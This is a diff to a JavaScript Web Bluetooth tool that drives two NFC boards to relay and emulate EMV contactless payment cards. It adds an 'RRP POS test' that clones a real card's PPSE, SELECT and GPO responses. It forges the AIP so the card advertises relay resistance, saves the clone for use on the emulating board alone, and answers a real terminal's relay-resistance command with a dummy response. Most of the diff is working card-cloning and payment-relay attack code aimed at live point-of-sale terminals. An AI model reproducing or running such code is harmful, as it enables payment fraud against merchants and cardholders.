@@ -1450,6 +1450,140 @@ async function checkRRP() {
   log('RRP check done. (AIP bit is best-effort; the 80EA probe result is authoritative.)', 'ok');
 }
 
+// ---------------------------------------------------------------------------
+// RRP POS TEST (item 2): does a POS actually USE relay resistance?
+// The ghost emulates a card that ADVERTISES RRP (AIP byte-2 bit-1 forced on).
+// Tap it on the POS and watch what the POS sends after GPO:
+//   * 80 EA (EXCHANGE RELAY RESISTANCE DATA)  => this POS USES/ENFORCES RRP.
+//   * 00 B2 (READ RECORD) with no prior 80 EA => this POS does NOT use RRP.
+// A "yes" is conclusive. A "no" is only trustworthy because our lure genuinely
+// advertises RRP (that's the whole point of forcing the AIP bit).
+// The lure is captured once from your real card over the mole (PPSE/SELECT/GPO,
+// empty-PDOL so the POS's GPO command is fixed and cache-matches), GPO AIP forced
+// to advertise RRP, and saved to localStorage. Records are deliberately NOT cached
+// so the POS's post-GPO command always reaches this loop for the verdict.
+let rrpTestRunning = false;
+const RRP_PROFILE_KEY = 'rrpPosCardV1';
+
+function forceRrpAip(gpo) {           // set AIP byte-2 bit-1 (0x01) = RRP supported, IN PLACE
+  // GPO format 2: 77 .. 82 02 <AIP> ..   |   format 1: 80 <len> <AIP(2)> <AFL>
+  // (tlvFind returns COPIES via .slice, so we must patch the raw bytes directly.)
+  if (gpo.length >= 4 && gpo[0] === 0x80) { gpo[3] |= 0x01; return true; }
+  for (let j = 0; j + 3 < gpo.length; j++) {
+    if (gpo[j] === 0x82 && gpo[j + 1] === 0x02) { gpo[j + 3] |= 0x01; return true; }
+  }
+  return false;
+}
+
+async function captureRrpLure(M) {    // clone + PPSE + SELECT + GPO(RRP-forced); records NOT cached
+  try { await M.relayStop(); } catch (_) {}
+  const r = await M.relayStart();
+  if (!(r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length)) return null;
+  const anti = r.parsed, pairs = [];
+  const rly = async (a) => { try { const x = await M.relayApdu(a); return x.status === ST.HF_TAG_OK ? x.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
+  const PPSE = hexToBytes('00A404000E325041592E5359532E444446303100');
+  const fci = await rly(PPSE);
+  if (!(fci.length > 2)) return null;
+  pairs.push({ cmd: PPSE, resp: fci });
+  const seen = new Set();
+  const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seen.has(h)) return false; seen.add(h); return true; });
+  const GPO = hexToBytes('80A8000002830000');
+  let gpoForced = false;
+  for (const aid of aids) {
+    const sel = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
+    const sr = await rly(sel);
+    if (!sw9000(sr)) continue;
+    pairs.push({ cmd: sel, resp: sr });          // SELECT cached (needed standalone)
+    const gr = await rly(GPO);
+    if (sw9000(gr)) {
+      const before = tlvFind(gr, 0x82)[0];
+      const ok = forceRrpAip(gr);                  // GPO cached, RRP-advertising (patched in place)
+      const after = tlvFind(gr, 0x82)[0];
+      log(`lure: ${hxc(aid)} GPO AIP ${before ? hxc(before) : '?'} -> ${after ? hxc(after) : '?'} (RRP bit ${ok ? 'SET' : 'NOT FOUND'})`, ok ? 'ok' : 'warn');
+      pairs.push({ cmd: GPO, resp: gr }); gpoForced = gpoForced || ok;
+    }
+  }
+  try { await M.relayStop(); } catch (_) {}
+  if (!gpoForced) { log('lure: no AID reached GPO — cannot build an RRP-advertising card', 'err'); return null; }
+  return { anti, pairs };
+}
+
+function saveRrpLure(p) {
+  try { localStorage.setItem(RRP_PROFILE_KEY, JSON.stringify({
+    anti: { uid: hxc(p.anti.uid), atqa: hxc(p.anti.atqa), sak: p.anti.sak, ats: hxc(p.anti.ats) },
+    pairs: p.pairs.map(x => ({ cmd: hxc(x.cmd), resp: hxc(x.resp) })) })); } catch (_) {}
+}
+function loadRrpLure() {
+  try { const j = JSON.parse(localStorage.getItem(RRP_PROFILE_KEY) || 'null'); if (!j) return null;
+    return { anti: { uid: hexToBytes(j.anti.uid), atqa: hexToBytes(j.anti.atqa), sak: j.anti.sak, ats: hexToBytes(j.anti.ats) },
+             pairs: j.pairs.map(x => ({ cmd: hexToBytes(x.cmd), resp: hexToBytes(x.resp) })) }; } catch (_) { return null; }
+}
+
+async function rrpPosTest() {
+  if (rrpTestRunning) { rrpTestRunning = false; log('stopping RRP POS test…', 'warn'); return; }
+  if (running) { log('stop the relay first', 'warn'); return; }
+  if (!ghost.connected) { log('connect the GHOST board first (the one you tap on the POS)', 'err'); return; }
+  const slot = parseInt($('slot').value, 10) || 1;
+
+  let lure = loadRrpLure();
+  if (lure) {
+    log(`RRP POS test: using saved lure card (${lure.pairs.length} responses). To rebuild, connect mole + card and clear site data.`, 'ok');
+  } else if (mole.connected) {
+    log('RRP POS test: no saved lure — building it once from your card on the mole. Place the card…', 'warn');
+    await mole.changeMode(true);
+    for (let i = 0; i < 40 && !lure; i++) {
+      try { if ((await mole.cardProbe(true)).status === ST.HF_TAG_OK) lure = await captureRrpLure(mole); } catch (_) {}
+      if (!lure) await sleep(300);
+    }
+    if (!lure) { log('could not read a card on the mole to build the lure', 'err'); return; }
+    saveRrpLure(lure);
+    log(`RRP POS test: lure built (${lure.pairs.length} responses; GPO AIP forced to advertise RRP) and saved. You can now use the ghost alone.`, 'ok');
+  } else {
+    log('RRP POS test: no saved lure and no mole. Connect mole + your card once to build the lure (it is then saved for ghost-only use).', 'err');
+    return;
+  }
+
+  rrpTestRunning = true;
+  if ($('rrptest-btn')) $('rrptest-btn').textContent = 'Stop RRP test';
+  setRrpBadge('watch');
+  log('=== RRP POS TEST armed: ghost is emulating an RRP-advertising card. TAP IT ON THE POS. ===', 'ok');
+  try {
+    await armGhost(lure.anti, slot, lure.pairs);
+    ghost.setLed(1).catch(() => {});
+    const EMPTY = new Uint8Array(0);
+    let pending = EMPTY, verdict = null, idle = 0;
+    while (rrpTestRunning) {
+      let r; try { r = await ghost.apduSendRecv(pending, 600); } catch (_) { pending = EMPTY; continue; }
+      pending = EMPTY;
+      if (r.status !== ST.SUCCESS) {           // no APDU this window
+        if (verdict && ++idle > 3) { log('— tap ended; tap again to re-test, or Stop —', 'ok'); verdict = null; idle = 0; setRrpBadge('watch'); }
+        continue;
+      }
+      idle = 0;
+      const apdu = r.data;
+      if (apdu.length >= 2 && apdu[0] === 0x80 && apdu[1] === 0xEA) {
+        if (verdict !== 'rrp') log('✓✓ POS SENT 80 EA (EXCHANGE RELAY RESISTANCE DATA) — THIS POS USES RRP', 'warn');
+        setRrpBadge('enforced'); verdict = 'rrp';
+        pending = hexToBytes('000000000001000200019000');   // dummy RRP response so the POS proceeds
+      } else if (apdu.length >= 2 && apdu[0] === 0x00 && apdu[1] === 0xB2) {
+        if (!verdict) { log('POS went to READ RECORD after GPO with NO 80 EA — THIS POS does NOT use RRP', 'ok'); setRrpBadge('clear'); verdict = 'norrp'; }
+        pending = hexToBytes('6A83');
+      } else {
+        log('  ghost saw: ' + hex(apdu).trim());
+        pending = hexToBytes('6D00');
+      }
+    }
+  } catch (e) {
+    log('RRP POS test error: ' + e, 'err');
+  } finally {
+    try { await ghost.changeMode(true); } catch (_) {}
+    ghost.setLed(5).catch(() => {});
+    rrpTestRunning = false;
+    if ($('rrptest-btn')) $('rrptest-btn').textContent = 'RRP POS test';
+    log('=== RRP POS TEST stopped ===', 'ok');
+  }
+}
+
 window.addEventListener('DOMContentLoaded', () => {
   if (!navigator.bluetooth) {
     log('Web Bluetooth is not available in this browser. Use desktop or Android Chrome/Edge (not iOS Safari).', 'err');
@@ -1463,6 +1597,7 @@ window.addEventListener('DOMContentLoaded', () => {
   $('rxdump-btn').onclick = dumpRxLog;
   $('clearcache-btn').onclick = clearCache;
   if ($('rrp-btn')) $('rrp-btn').onclick = checkRRP;
+  if ($('rrptest-btn')) $('rrptest-btn').onclick = rrpPosTest;
   if ($('genac-btn')) $('genac-btn').onclick = testPayment;
   if ($('cachesafe-btn')) $('cachesafe-btn').onclick = testCacheSafety;
   if ($('readers-btn')) $('readers-btn').onclick = toggleReaders;
